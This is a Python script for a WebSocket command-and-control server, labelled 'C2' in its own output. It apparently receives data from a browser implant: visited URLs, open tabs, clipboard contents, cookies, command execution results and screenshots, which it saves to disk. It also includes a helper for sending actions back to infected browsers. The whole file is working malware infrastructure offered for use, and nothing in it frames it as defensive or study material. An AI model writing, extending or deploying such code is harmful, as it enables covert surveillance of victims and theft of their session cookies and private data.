import asyncio
import json
import base64
import time
import os
import websockets
from websockets.server import serve

BIND_HOST = "0.0.0.0"
BIND_PORT = int(os.environ.get("PORT", 9001))

clients = {}
msg_id = 0

def next_id():
    global msg_id
    msg_id += 1
    return msg_id

async def send_cmd(ws, action, **kwargs):
    mid = next_id()
    await ws.send(json.dumps({"action": action, "id": mid, **kwargs}))
    return mid

async def handler(ws):
    addr = ws.remote_address
    clients[addr] = ws
    print(f"[+] connected: {addr}", flush=True)
    try:
        async for raw in ws:
            msg = json.loads(raw)
            t = msg.get("type")
            if t == "hello":
                print(f"    UA: {msg.get('ua','?')}", flush=True)
            elif t == "nav":
                print(f"    [nav] tab={msg['tabId']} -> {msg['url']}", flush=True)
            elif t == "tab_snapshot":
                print(f"    [tabs] {len(msg['data'])} open", flush=True)
                for tab in msg['data']:
                    print(f"      [{tab['id']}] {tab['title'][:50]} -- {tab['url'][:70]}", flush=True)
            elif t == "screenshot":
                path = f"shot_{int(time.time())}.jpg"
                data = msg["data"].split(",", 1)[1]
                with open(path, "wb") as f:
                    f.write(base64.b64decode(data))
                print(f"    [screenshot] saved -> {path}", flush=True)
            elif t in ("exec_result", "clipboard", "cookies", "tabs", "ack"):
                print(f"    [{t}] id={msg.get('id')} -> {str(msg.get('data',''))[:200]}", flush=True)
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        clients.pop(addr, None)
        print(f"[-] disconnected: {addr}", flush=True)

async def main():
    print(f"[*] C2 listening on {BIND_HOST}:{BIND_PORT}", flush=True)
    async with serve(handler, BIND_HOST, BIND_PORT):
        await asyncio.Future()

asyncio.run(main())
